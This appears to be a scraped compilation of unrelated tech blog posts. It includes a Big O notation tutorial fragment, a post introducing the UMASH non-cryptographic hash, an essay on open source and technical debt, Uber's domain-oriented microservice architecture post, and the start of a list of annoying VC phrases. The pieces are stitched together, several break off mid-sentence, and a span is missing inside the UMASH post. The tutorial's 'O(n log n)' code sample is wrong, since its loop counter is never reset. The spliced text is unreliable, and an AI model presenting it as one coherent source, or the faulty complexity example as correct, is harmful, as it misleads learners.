<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleO1(n):
    print(n + n)</pre>



<h4>Logarithmic complexity <strong>O(log(n))</strong></h4>



<p>The log complexity <strong>O(log(n))</strong> is more tricky to understand if you don't have <a href="http://www.mclph.umn.edu/mathrefresh/logs.html" target="_blank" rel="noreferrer noopener">the notion of logarithm in math</a>. In a greatly simplified way, a logarithmic tendency is the opposite of an exponential tendency. Where an exponential trend will multiply over time, and the performance of your algo with it, the logarithmic trend will divide.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleOlogn(n):
    i = 1

    while(i &lt; n):
        i = i * 2
        print(i)</pre>



<p>The <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm" target="_blank" rel="noreferrer noopener">binary search</a> algorithm works with this trend.</p>



<h4>Linear complexity O(n)</h4>



<p>The linear complexity <strong>O(n)</strong> evolves in direct relation with the size of the input. The number of operations grows with the number of input. The simplest example is a simple loop.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleOn(n):
    for number in range(n):
            print(number + 1)</pre>



<h4>Linearithmic complexity <strong>O(n log(n))</strong></h4>



<p>Linear complexity <strong>O(n log(n))</strong> uses the same "divide and conquer" approach as logarithmic complexity except that it does so on each element of input n.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleOlogn(n):
    i = 1
    for number in range(n):
        while(i &lt; n):
            i = i * 2
            print(i)</pre>



<p>The merge sort algorithm works with this trend.</p>



<p>The <a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noreferrer noopener">merge sort</a> algorithm works with this trend.</p>



<h4>Quadratic complexity O(n²)</h4>



<p>The quadratic complexity <strong>O(n²)</strong> will evolve to the square of the input. The number of operations will grow to the square of the input. Two nested loops is the perfect example for this trend.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def exempleOn2(n):
    for number in range(n):
        for number in range(n):
            print(number + 1)</pre>



<p>The best-known sorting algorithms (<a href="https://en.wikipedia.org/wiki/Quicksort" target="_blank" rel="noreferrer noopener">quick sort</a>, <a href="https://en.wikipedia.org/wiki/Bubble_sort" target="_blank" rel="noreferrer noopener">bubble sort</a>, <a href="https://en.wikipedia.org/wiki/Insertion_sort" target="_blank" rel="noreferrer noopener">insertion sort</a>) have this tendency.</p>



<p>There are plenty of others that I'm not telling you about. If you want to see them all, <a href="https://en.wikipedia.org/wiki/Analysis_of_algorithms" target="_blank" rel="noreferrer noopener">the wiki page</a> is interesting.</p>



<figure><img src="https://i.imgur.com/yOEbMzp.jpg" data-src="https://i.imgur.com/yOEbMzp.jpg" alt="big o notation"></figure>



<p><strong>Also, look at <a href="https://www.youtube.com/watch?v=v4cd1O4zkGw" target="_blank" rel="noreferrer noopener">this short YouTube video</a> which is EXCELLENT to understand the rules of simplifying the writing of the notation.</strong> For example why is O(3) simplified into O(1)? Why do two loops that are not nested stay in a complexity O(n) ? Like any subject in your profession, there is an ocean of knowledge.</p>



<figure><img src="https://i.redd.it/gevxp9dvk7b11.jpg" data-src="https://i.redd.it/gevxp9dvk7b11.jpg" alt="ocean"></figure>



<p>Finally, we will discuss why all this is important.</p>



<h3>Why is this important?</h3>



<p>I see developers working with small volumes coming in, convinced that all this will be of no use to them. Or even developers with 300 years of experience who don't need all this stuff.</p>



<p>The Big O notation quickly answers a question that every developer should ask himself during his work. <strong>How much does my solution scale?</strong> And it doesn't matter if your volumes are huge or not. It's important that you understand the limits of your solutions in order to estimate the limits of your system.</p>



<p>Then, by understanding this notion, <strong>you will have a standard language to discuss with other developers</strong>. This is important for comparing solutions, making trade-offs and simply exchanging technical information. </p>



<p>If you don't understand what we're talking about, you have a handicap. Personally, this even happened to me in interviews at the beginning of my career. I had no idea what he was talking about and I was in panic mode.</p>



<figure><img src="https://i.ytimg.com/vi/a3lcGnMhvsA/maxresdefault.jpg" data-src="https://i.ytimg.com/vi/a3lcGnMhvsA/maxresdefault.jpg" alt="big o notation"></figure>



<p>Having this basic understanding changed the way I approached problems.  And as a developer, it's important to make optimized code.</p>



<p>Last but not least, these notions will allow you to quickly spot what is wrong with a slow system. A lot of time is spent reading and repairing other developers' code. <strong>All of this will allow you to find and optimize bits of slow code faster.</strong></p>



<h3>Epilogue</h3>



<p>I hope this introduction to Big O notation made you want to know more. It's important to know this concept in order to better optimized your code. And generally speaking, it will be more and more useful to you as your career evolves.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>We accidentally a whole hash function… but we had a good reason!
Our
<a href="https://github.com/backtrace-labs/umash">MIT-licensed UMASH hash function</a>
is a decently fast non-cryptographic hash function that guarantees
a worst-case bound on the probability of collision
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">between any two inputs generated independently of the UMASH parameters</a>.</p><p>On the
<a href="https://en.wikichip.org/wiki/intel/xeon_platinum/8175m">2.5 GHz Intel 8175M</a>
servers that power <a href="https://backtrace.io/">Backtrace</a>’s hosted
offering, UMASH computes a 64-bit hash for short cached inputs of up
to 64 bytes in 9-22 ns, and for longer ones at up to 22 GB/s, while
guaranteeing that two distinct inputs of at most \(s\) bytes collide
with probability less than \(\lceil s / 2048 \rceil \cdot 2^{-56}\).
If that’s not good enough, we can also reuse most of the parameters to
compute two independent UMASH values. The resulting 128-bit
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint function</a>
offers a short-input latency of 9-26 ns, a peak throughput of 11.2
GB/s, and a collision probability of \(\lceil s / 2048 \rceil^2 \cdot
2^{-112}\) (better than \(2^{-70}\) for input size up to 7.5 GB).
These collision bounds hold for all inputs constructed without any
feedback about the randomly chosen UMASH parameters.</p><p>The latency on short cached inputs (9-22 ns for 64 bits, 9-26 ns for
128) is somewhat worse than the state of the art for non-cryptographic
hashes—
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> achieves
8-15 ns and <a href="http://fastcompression.blogspot.com/2019/03/presenting-xxh3.html">xxh3</a>
8-12 ns—but still in the same ballpark. It also
compares well with latency-optimised hash functions like
<a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function#FNV-1a_hash">FNV-1a</a>
(5-86 ns) and
<a href="https://en.wikipedia.org/wiki/MurmurHash#MurmurHash2">MurmurHash64A</a>
(7-23 ns).</p><p>Similarly, UMASH’s peak throughput (22 GB/s) does not match
the current best hash throughput (37 GB/s with
<a href="https://github.com/Cyan4973/xxHash">xxh3</a>
and <a href="https://github.com/gamozolabs/falkhash">falkhash</a>, apparently
10% higher with <a href="https://github.com/cmuratori/meow_hash">Meow hash</a>),
but does comes within a factor of two; it’s actually higher than that of
some performance-optimised hashes, like
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> (16 GB/s) and
<a href="https://github.com/google/farmhash">farmhash32</a>
(19 GB/s). In fact, even the 128-bit fingerprint (11.2 GB/s) is
comparable to respectable options like
<a href="https://github.com/aappleby/smhasher/blob/master/src/MurmurHash2.cpp#L89">MurmurHash64A</a>
(5.8 GB/s) and
<a href="https://burtleburtle.net/bob/hash/spooky.html">SpookyHash</a> (11.6 GB/s).</p><p>What sets UMASH apart from these other non-cryptographic hash
functions is its proof of a collision probability bound. In the
absence of an adversary that adaptively constructs pathological inputs
as it infers more information about the randomly chosen parameters, we
know that two distinct inputs of \(s\) or fewer bytes will have the
same 64-bit hash with probability at most \(\lceil s / 2048 \rceil
\cdot 2^{-56},\) where the expectation is taken over the random
“key” parameters.</p><p>Only one non-cryptographic hash function in
<a href="https://github.com/rurban/smhasher">Reini Urban’s fork of SMHasher</a>
provides this sort of bound: <a href="https://github.com/lemire/clhash">CLHash</a>
<a href="https://arxiv.org/abs/1503.03465">guarantees a collision probability \(\approx 2^{-63}\)</a>
in the same
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">universal hashing</a>
model as UMASH. While CLHash’s peak throughput (22 GB/s) is
equal to UMASH’s, its latency on short inputs is worse (23-25 ns
instead of 9-22ns). We will also see that its stronger collision
bound remains too weak for many practical applications. In order to
compute a <a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a>
with CLHash, one would have to combine multiple hashes, exactly like
we did for the 128-bit UMASH fingerprint.</p><p>Actual cryptographic hash functions provide stronger bounds in a much
more pessimistic model; however they’re also markedly slower than
non-cryptographic hashes. <a href="https://github.com/BLAKE3-team/BLAKE3">BLAKE3</a>
needs at least 66 ns to hash short inputs, and achieves a peak throughput
of 5.5 GB/s. Even the <a href="https://github.com/rust-lang/rust/issues/29754">reduced-round SipHash-1-3</a>
hashes short inputs in 18-40 ns and longer ones at a peak throughput
of 2.8 GB/s. That’s the price of their pessimistically adversarial
security model. Depending on the application, it can make sense to
consider a more restricted adversary that must prepare its dirty deed
before the hash function’s parameters are generated at random, and
still ask for provable bounds on the probability of collisions.
That’s the niche we’re targeting with UMASH.</p><p>Clearly, the industry is comfortable with no bound at all.
However, even in the absence of
<a href="https://www.131002.net/siphash/#at">seed-independent collisions</a>,
timing side-channels in a data structure implementation could
theoretically leak information about colliding inputs, and iterating
over a hash table’s entries to print its contents can divulge even more
bits. A sufficiently motivated adversary could use something like
that to learn more about the key and deploy an algorithmic denial of
service attack. For example, the linear structure of UMASH (and of
other polynomial hashes like CLHash) makes it easy to combine known
collisions to create exponentially more colliding inputs. There is no
universal answer; UMASH is simply another point in the solution space.</p><p>If reasonable performance coupled with an actual bound on collision
probability <em>for data that does not adaptively break the hash</em> sounds
useful to you,
<a href="https://github.com/backtrace-labs/umash">take a look at UMASH on GitHub</a>!</p><p>The <a href="#but-why">next section</a> will explain why we found it useful to
design another hash function. The rest of the post
<a href="#umash-high-level">sketches how UMASH works</a> and
<a href="#implementation-tricks">how it balances short-input latency and strength</a>,

the same unloaded 2.5 GHz Xeon 8175M. While we did not disable
frequency scaling (#cloud), the clock rate seemed stable at 3.1
GHz during our run.</small></p><h2 id="a-idbut-whyahow-did-we-even-get-here"><a id="but-why"></a>How did we even get here?</h2><p>Engineering is the discipline of satisficisation: crisply defined
problems with perfect solutions rarely exist in reality, so we must
resign ourselves to satisfying approximate constraint sets “well
enough.” However, there are times when all options are not only
imperfect, but downright sucky. That’s when one has to put on a
different hat, and question the problem itself: are our constraints
irremediably at odds, or are we looking at an under-explored
solution space?</p><p>In the former case, we simply have to want something else. In the
latter, it might make sense to spend time to really understand the
current set of options and hand-roll a specialised approach.</p><p>That’s the choice we faced when we started caching intermediate
results in
<a href="https://help.backtrace.io/en/articles/2428859-web-console-overview">Backtrace’s database</a>
and found a dearth of acceptable hash functions. Our in-memory
columnar database is a core component of the backend, and, like most
analytics databases, it tends to process streams of similar queries.
However, a naïve query cache would be ineffective: our more heavily
loaded servers handle a constant write load of more than 100 events
per second with dozens of indexed attributes (populated column values)
each. Moreover, queries invariably select a large number of data
points with a time windowing predicate that excludes old data… and
the endpoints of these time windows advance with each wall-clock
second. The queries evolve over time, and must usually consider newly
ingested data points.</p><p><a href="https://www.gsd.inesc-id.pt/~rodrigo/slider_middleware14.pdf">Bhatotia et al’s Slider</a>
show how we can specialise the idea of
<a href="http://adapton.org/">self-adjusting or incremental computation</a>
for repeated MapReduce-style queries over a sliding window.
The key idea is to split the data set at stable boundaries (e.g., on
date change boundaries rather than 24 hours from the beginning of the
current time window) in order to expose memoisation opportunities, and
to do so recursively to repair around point mutations to older data.</p><p>Caching fully aggregated partial results works well for static
queries, like scheduled reports… but the first step towards creating
a great report is interactive data exploration, and that’s an activity
we strive to support well, even when drilling down tens of millions of
rich data points. That’s why we want to also cache intermediate
results, in order to improve response times when tweaking a saved
report, or when crafting ad hoc queries to better understand how and
when an application fails.</p><p>We must go back to a
<a href="http://www.umut-acar.org/self-adjusting-computation">more general incremental computation strategy</a>:
rather than only splitting up inputs, we want to stably partition the
data dependency graph of each query, in order to identify shared
subcomponents whose results can be reused. This finer grained
strategy surfaces opportunities to “resynchronise” computations, to
recognize when different expressions end up generating a subset of
identical results, enabling reuse in later steps. For example, when
someone updates a query by adding a selection predicate that only
rejects a small fraction of the data, we can expect to reuse some of
the post-selection work executed for earlier incarnations of the
query, if we remember to key on the selected data points rather than
the predicates.</p><p>The complication here is that these intermediate results tend to be
large. Useful analytical queries start small (a reasonable query
coupled with cache/transaction invalidation metadata to stand in for
the full data set), grow larger as we select data points, arrange them
in groups, and materialise their attributes, and shrink again at the
end, as we summarise data and throw out less interesting groups.</p><p>When caching the latter shrinking steps, where resynchronised reuse
opportunities abound and can save a lot of CPU time, we often
find that storing a fully materialised representation of the cache key
would take up more space than the cached result.</p><p>A classic approach in this situation is to fingerprint cache keys with
a cryptographic hash function like
<a href="https://en.wikipedia.org/wiki/BLAKE_(hash_function)">BLAKE</a>
or <a href="https://en.wikipedia.org/wiki/SHA-3">SHA-3</a>, and store a
compact (128 or 256 bits) fingerprint instead of the cache key: the
probability of a collision is then so low that we might as well assume
any false positive will have been caused by a bug in the code or a
hardware failure. For example,
<a href="https://users.ece.cmu.edu/~omutlu/pub/memory-errors-at-facebook_dsn15.pdf#page=3">a study of memory errors at Facebook</a>
found that uncorrectable memory errors affect 0.03% of servers each
month. Assuming a generous clock rate of 5 GHz, this means each
clock cycle may be afflicted by such a memory error with probability
\(\approx 2.2\cdot 10^{-20} &gt; 2^{-66}.\) If we can guarantee that
distinct inputs collide with probability significantly less than
\(2^{-66}\), e.g., \(&lt; 2^{-70},\) any collision is far
more likely to have been caused by a bug in our code or by
hardware failure than by the fingerprinting algorithm itself.</p><p>Using cryptographic hashes is certainly safe enough, but requires a lot of
CPU time, and, more importantly, worsens latency on smaller keys (for
which caching may not be that …</p></div></article></div></div>

I used it, I didn’t know I used it. I logged into Linux servers with <a href="https://www.putty.org/" target="_blank" rel="noopener">PuTTy</a> (yes, I was a Windows user), I used an open source text editor, and so on. I was just consuming it, I didn’t really get what it was. I just thought “this is great, AND free!”</p><p id="d330">Years later I got a job at a company called Rareface as the Head of Development. I’d come from a long line of Windows-based agency jobs, writing closed-source software in Microsoft development environments, or using proprietary CMS like SharePoint to deliver content.</p><p id="37b1">Rareface were having a hard time. They’d asked a company in Shoreditch to build them <a href="https://en.wikipedia.org/wiki/Myspace" target="_blank" rel="noopener">MySpace</a> in a box for £80,000. The company in Shoreditch foolishly agreed, and nobody did the maths. Nobody asked the fundamental question: If MySpace’s platform has had tens of millions of dollars invested in it, how on Earth do we think we’re going to build something decent for £80,000?</p><p id="262c">Of course, you can’t. So the inevitable happened. Rareface and the other company started to fall out, I was stuck in the middle, ostensibly ‘responsible’ for the platform with no influence over the original contract. I spoke with a colleague called Bernard (a damned good programmer), about what to do.</p><p id="4111">He knew a lot about open source software. He suggested that while a little company couldn’t make a MySpace, the open source software community could harness the kind of development resource MySpace has in spades.</p><p id="9bc9">We looked and reviewed half a dozen open source CMS and, after some debate we chose <a href="https://www.drupal.org/" target="_blank" rel="noopener">Drupal</a> (which at the time sold itself as ‘community plumbing’ — perfect!) It then became my job to go to the senior management and investors of Rareface and convince them to allow me to fire the development company in Shoreditch and re-platform us on to Drupal.</p><p id="d2e9"><strong>I succeeded.</strong></p><p id="319d">We let the other guys go. Which was a pity. They simply bit off more than anyone could chew. I hired a freelance Drupal developer called Mark, who was awesome. He taught the team how to work with Drupal, we created a migration plan, we migrated their key properties over, technically things were going great. Financially, not so much, but that’s another story.</p><p id="92cd">Mainly, I was seeing the power of open source software for the first time. It’s logical, if you think about it. If open source software gets its governance right, you’re talking about people collaboratively writing software, making a living while driving forward a product with far more resource than even the largest technology firm can bring to bear. The potential is enormous. Indeed, <a href="https://w3techs.com/technologies/overview/operating_system/all" target="_blank" rel="noopener">not for nothing does most of the Internet run on open source software</a>.</p><p id="6a48">In Drupal we found our MySpace in a box. And the equivalent of tens of millions of dollars <em>had</em> been invested in it. It was simply invested in a different way, it was crowd-sourced, paid for by the customers of the people who worked on the project, in time by the volunteers who did it for fun, etc.</p><p id="9b68">Appetite whetted, but I was still just a consumer. So how do you cross over from being a passive user of open source software to engaging with it, developing it and making your own contributions?</p><p id="2c1d">As an individual, there are loads of ways. You can get involved in documentation or you can help out supporting people new to a system in chat or in support tickets. Most open source software projects have open forums for help and support and you can join associations to give money, you can attend events, you can tell all your friends about a project to help it gain traction. This all helps.</p><p id="6f8b">And that’s how I started. I enjoyed the <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat" target="_blank" rel="noopener">IRC</a> community, I liked showing people how to do things in <a href="https://www.drupal.org/project/issues/" target="_blank" rel="noopener">the Drupal issue queue</a>. In time I started producing patches to code, fixing bugs I saw while using Drupal modules and giving my fixes back.</p><p id="2c0c">Most people nod sagely at this point, most people kind of get why giving back in this way would help. But let’s introduce another scenario. I want Drupal to do something it’s never done before, so I write a new module to achieve that. And…</p><p id="acc4"><strong>I give it away for free</strong></p><p id="4f84"><em>I’m sorry, wut?!</em></p><p id="0463">I still knew some Microsoft guys and they all thought I was nuts. “Why would you do that? Why wouldn’t you sell it, charge a download fee?”</p><p id="7f9f">And so we arrive at the nitty-gritty.</p><p id="80ec">Open source software developers will give you all kinds of reasons why you should give away your code: it’s the right thing to do for supporting education and developing economies; if you share your code others will use it, improve it and give you back the improvements; it’s just another business model, you’re paid for consultancy rather than a product, and everybody wins; it’s more secure because everyone can see the code and warn you of issues; the open source model reduces business risk, as you can’t be held to ransom; etc.</p><p id="79c9">This is all true. But there’s another huge reason why I continue to push Code Enigma to open source its software, wherever feasible. It all comes down to technical debt.</p><p id="94fa"><strong>So what is technical debt?</strong></p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2404/1*qkOX3ZR9yeUUjExTYClfPA.png" width="1202" height="912" srcset="https://miro.medium.com/max/552/1*qkOX3ZR9yeUUjExTYClfPA.png 276w, https://miro.medium.com/max/1000/1*qkOX3ZR9yeUUjExTYClfPA.png 500w" sizes="500px" data-old-src="https://miro.medium.com/max/60/1*qkOX3ZR9yeUUjExTYClfPA.png?q=20"></p></div></div></div><figcaption>A person with a paper bag on their head with a sad face drawn on it</figcaption></figure><p id="872e">A simplistic explanation would be every time a developer does something quickly, rather than properly (and there may be reasons for this; I’m not implying a developer who does that is bad, it’s often commercially-driven) they introduce a debt that needs to be paid back later. At some point in the future that code they wrote, which they <em>know</em> to be bad but which was required to hit a deadline, needs to be done the right way. We’ve all been there. <em>That’s</em> technical debt.</p><p id="9321">When you write software for a company that will never see the light of day, there’s often little pressure to <em>not</em> make short-term decisions. If you know it’ll never be scrutinised, if you know it’ll never be used again, there’s less pressure to do it properly. There’s less pressure to document it or be careful about code style.</p><p id="3a33">The moment that software is going to be public, all that changes. Let me give you an example of the kinds of things we had to fix, the technical debt we had to deal with, when we decided to open source <a href="https://github.com/codeenigma/deployments" target="_blank" rel="noopener">our continuous integration scripts</a>.(This is pseudo-code).</p><p id="05a5">Our CI scripts are for deploying applications built by our developers to the servers automatically, so developers don’t spend time releasing. We deploy code in the same way for all our customers, but then one day a big customer, let’s call them ACME, wants something different. When our scripts were closed source, this is the sort of thing that used to happen if we were in a hurry, which we often were:</p><pre><span id="36eb">if "acme" in repo:<br>   // do some special stuff<br>else:<br>   // do the usual stuff</span></pre><p id="622c">And that is technical debt! We can’t leave it like that. What if ACME change their mind? We have to go back through the code and remove that statement. What if someone else wants to do the same thing ACME does? Worse, what if someone wants to do another different thing at the same point?</p><p id="4b15">Also, when we open-sourced our CI we could hardly leave ACME’s name in the code! So things like that became more like this:</p><pre><span id="e533">// our client might want to do some special stuff<br>if special_stuff:<br>    run("./my_special_script.py")</span></pre><p id="513b">Now any customer who wants to do something special can include a ‘my_special_script’ script in their repository. This is, of course, a very simplistic example, but you get the idea.</p><p id="ae82">Sure, you can have code review procedures, merge requests, and so on. You can achieve this sort of rigour around technical debt without open-sourcing your software. But staff and management change, there may be business pressure to ignore the procedures in place at any given moment, there are all sorts of reasons why an organisation might choose to live with that kind of technical debt.</p><p id="f6e5">My point is if your code is open source, <em>you simply cannot ignore it</em>.</p><p id="3b94">Open-sourcing our software makes us better developers <em>because</em> we have to think about it. We have to be deliberate and thoughtful by default when we’re planning and writing code, because we intend to make it public.</p><p id="b39f">It also makes us better remote workers, which is important for us, being <a href="https://remotewise.io/companies/code-enigma/" target="_blank" rel="noopener">a proudly 100% remote working company</a>. Open-sourcing everything we do makes our developers automatically familiar with the tools required to work collaboratively over distance. It equips us to direct online conversations, accept input from others, accept writing documentation as a normal thing you <em>just do</em>, work on multiple streams without tripping up, develop stronger workflows, which all makes us better at work too.</p><p id="677d">We also get ‘free’ code review from people who use our code so we get extra eyes on our work. Different perspectives, other ideas, efficiencies we hadn’t thought of, etc.</p></div></div></section><section><div><div><p id="707a"><strong>I assert: open source developers write better code.</strong></p><p id="6be1">They might not even be better developers, but they are ‘freed’ from the short-termism that inevitably creeps into any closed source code, however good the intentions are of those involved, and they are exposed to a world of ideas and techniques that can only improve them.</p><p id="58b4">So my advice to other companies out there in our sector is this:</p><p id="cf1f">If your software is good enough to open source, do it. If it isn’t, you should figure out what you’d have to do to make it open source, because that’ll be all your technical debt. And if it <em>is</em> open source, you should always be using it.</p><p id="6ede">That’s the <em>‘eat your own dog food’</em> part, why would you open-source and maintain something you wouldn’t use yourself?</p><p id="b3cc">Every company should open source as much software as it can. You will write better software automatically.

<p><span>Recently there has been substantial discussion around the downsides of service oriented architectures and microservice architectures in particular. While only a few years ago, many people readily adopted microservice architectures due to the numerous benefits they provide such as flexibility in the form of independent deployments, clear ownership, improvements in system stability, and better separation of concerns, in recent years people have begun to decry microservices for their tendency to greatly increase complexity, sometimes making even </span><a href="https://www.youtube.com/watch?v=y8OnoxKotPQ"><span>trivial features</span></a><span> difficult to build.</span></p>
<p><span>As Uber has grown to around 2,200 critical microservices, we experienced these tradeoffs first hand. Over the last two years, Uber has attempted to reduce microservice complexity while still maintaining the benefits of a microservice architecture. With this blog post we hope to introduce our generalized approach to microservice architectures, which we refer to as “Domain-Oriented Microservice Architecture” (DOMA).</span></p>
<p><span>While it’s been popular in recent years to criticize microservice architectures because of these downsides, few people have advocated an outright rejection of microservice architectures. The operational benefits are too important, and it seems that there are no, or limited, alternatives. </span><b>Our goal with DOMA is to provide a way forward for organizations that want to reduce overall system complexity while maintaining the flexibility associated with microservice architectures.</b></p>
<p><span>This piece explains DOMA, the concerns that led to the adoption of this architecture for Uber, its benefits for platform and product teams, and, finally, some advice for teams who want to adopt this architecture.&nbsp;</span></p>

<h2><span>What is a microservice?</span></h2>
<p><span>Microservices are an extension of service oriented architectures. As opposed to the fairly large “services” of the 2000s, microservices are applications that represent a set of narrowly scoped functionality. These applications are hosted and available over the network and expose a well-defined interface. Other applications call this interface by making a “</span><a href="https://en.wikipedia.org/wiki/Remote_procedure_call"><span>remote procedure call</span></a><span>” (RPC).</span></p>
<p><span>The key characteristic of microservice architecture is the way in which code is hosted, called, and deployed. If we think about large, monolithic applications, they are generally split into encapsulated components with well-defined interfaces. These interfaces would then be called directly in-process as opposed to over the network. In this way, we can start to think of a microservice as a library with a performance hit (network I/O and serialization / deserialization) in order to call any of its functions.</span></p>
<p><span>When we think about microservices this way, we might question why we would adopt a microservice architecture at all. The answer is often </span><i><span>independent deployments and scaling</span></i><span>. With a large, monolithic application, an organization is forced to deploy or release all of their code at once. Each new version of an application can involve numerous changes. Deployments become risky and time consuming. Anyone can bring the whole system down.&nbsp;</span></p>
<p><span>In other words, organizations adopt microservices for an </span><i><span>operational</span></i><span> benefit at the expense of </span><i><span>performance</span></i><span>. Organizations also must take on the cost to maintain the infrastructure necessary to support microservices. In many situations, it turns out, this trade-off makes a lot of sense, but it is also a strong argument against a premature adoption of a microservice architecture.</span></p>

<h2><span>Motivations</span></h2>
<p><span>At Uber, we adopted a microservice architecture because we had (circa 2012-2013) primarily two monolithic services and ran into many of the operational issues that microservices solve.</span></p>
<ul>
<li><b>Availability Risks.</b><span> A single regression within a monolithic code base can bring the whole system (in this case, all of Uber) down.</span></li>
<li><b>Risky, expensive deployments.</b><span> These were painful and time consuming to perform with the frequent need for rollbacks.</span></li>
<li><b>Poor separation of concerns.</b><span> It was difficult to maintain good separations of concerns with a huge code base. In an exponential growth environment, expediency sometimes led to poor boundaries between logic and components.</span></li>
<li><b>Inefficient execution.</b><span> These issues combined made it difficult for teams to execute autonomously or independently.</span></li>
</ul>
<p><span>In other words, as Uber grew from 10s to 100s of engineers with multiple teams owning pieces of the tech stack, the monolithic architecture tied the fate of teams together and made it difficult to operate independently.</span></p>
<p><span>As a result, we adopted a microservice architecture. Ultimately our systems became more </span><i><span>flexible</span></i><span>, which allowed teams to be more </span><i><span>autonomous.</span></i></p>
<ul>
<li><b>System reliability.<span> Overall system reliability goes up in a microservice architecture. A single service can go down (and be rolled back) without taking down the whole system.</span></b></li>
<li><b>Separation of concerns.</b><span> Architecturally, microservice architectures force you to ask the question “why does this service exist?” more clearly defining the roles of different components.</span></li>
<li><b>Clear Ownership.<span> It becomes much clearer who owned what code. Services are typically owned at the individual, team, or org level enabling faster growth.</span></b></li>
<li>Autonomous execution.<span> Independent deployments + clearer lines of ownership unlock autonomous execution by various product and platform teams.</span></li>
<li><strong>Developer Velocity.</strong><span> Teams can deploy their code independently, which enables them to execute at their own pace.</span></li>
</ul>
<p><span>It’s not an exaggeration to say that Uber would not have been able to accomplish the scale and quality of execution that we maintain today without a microservice architecture.</span></p>
<p><span>However, as the company grew even larger, 100s of engineers to 1000s, we began to notice a set of issues associated with greatly increased system </span><i><span>complexity</span></i><span>. With a microservice architecture one trades a single monolithic code base for black boxes whose functionality can change at any time and easily cause unexpected behavior.</span></p>
<p><span>For instance, engineers had to work through around 50 services across 12 different teams in order to investigate the root cause of the problem.</span></p>
<p><span>Understanding dependencies between services can become quite difficult, as calls between services can go many layers deep. A latency spike in the nth dependency can cause a cascade of issues upstream.

<p><span>In order to build a simple feature an engineer often has to work across multiple services, all of which are owned by different individuals and teams. This requires extensive collaboration with time spent on meetings, design, and code review. The earlier promise of clear lines of service ownership is compromised as teams build code within each other’s services, modify each other’s data models, and even perform deployments on behalf of service owners. Networked monoliths can form, where services that appear to be independent all have to be deployed together to safely perform any change.</span></p>

<p><span>The result is a slower developer experience, instability for service owners, more painful migrations, etc. For organizations that have already adopted a microservice architecture there is no turning back. It becomes a case of “</span><i><span>can’t live with them, can’t live without them</span></i><span>.”&nbsp;</span></p>

<h2><span>Domain-Oriented Microservice Architecture</span></h2>
<p><span>If we can think of microservices as I/O bound libraries and a “microservice architecture” as a large, distributed application then we can use well understood architectures to think about how to organize our code.&nbsp;</span></p>
<p><span>“Domain-Oriented Microservice Architecture” thus draws heavily from established ways to organize code such as </span><a href="https://en.wikipedia.org/wiki/Domain-driven_design"><span>Domain-driven Design</span></a><span>, </span><a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html"><span>Clean Architecture</span></a><span>, </span><a href="https://en.wikipedia.org/wiki/Service-oriented_architecture"><span>Service-Oriented Architecture</span></a><span>, and object- and interface-oriented design patterns. </span><b>We think of DOMA as innovative only insofar as it is a relatively novel way to leverage established design principles in large distributed systems in large organizations.</b></p>
<p><span>The core principles and terminology associated with DOMA are as follows:</span></p>
<ol>
<li><span>Instead of orienting around single microservices, we oriented around collections of related microservices. We call these </span><b>domains.</b></li>
<li><span>We further create collections of domains which we call layers. The layer that the domain belongs to establishes what dependencies the microservices within that domain are allowed to take on. We call this </span><b>layer design.</b></li>
<li><span>We provide clean interfaces for domains that we treat as a single point of entry into the collection. We call these </span><b>gateways.</b></li>
<li><span>Finally, we establish that </span><i><span>each domain should be agnostic to other domains,</span></i><span> which is to say, a domain shouldn’t have logic related to another domain hard coded inside of its code base or data models. Since frequently teams do need to include logic in another team’s domain (for example, custom validation logic or some meta context on a data model), we provide an </span><b>extension architecture</b><span> to support well defined extension points within the domain.</span></li>
</ol>
<p><span>In other words, by providing a systematic architecture, domain gateways, and predefined extension points, DOMA intends to transform microservice architectures from something complex to something comprehensible: a structured set of flexible, reusable, and layered components.&nbsp;</span></p>
<p><span>The rest of this post digs into Uber’s implementation of DOMA, the benefits we’ve seen, and practical advice for companies which might want to adopt this approach.</span></p>

<h2><span>Uber’s Implementation</span></h2>
<h3><span>Domains</span></h3>
<p><span>Uber domains represent a collection of one or more microservices tied to a logical grouping of functionality. A common question in designing a domain is “how big should a domain be?” We give no guidance here. Some domains can include tens of services, some domains only a single service. The important task is to think carefully about the </span><i><span>logical </span></i><span>role of each collection. For instance, our map search services constitute a domain, fare services are a domain, matching platform (matching riders …</span></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><span>Today’s blog post is all about the annoying things that VCs commonly say or ask.&nbsp; I did a <a href="https://twitter.com/dunkhippo33/status/1128150604813967360">call out on Twitter this week</a> and these are the VCisms that the crowds have bubbled up as the most annoying things out of a VC’s mouth.</span></p>
<p><strong>1) What if Google Builds It?&nbsp;&nbsp;(<a href="https://twitter.com/pravesh">@pravesh</a>)</strong></p>
<p>This one was cited a LOT by many people on Twitter in various forms! There were variations — e.g. substitute Google with Amazon or Facebook or any other big company.</p>
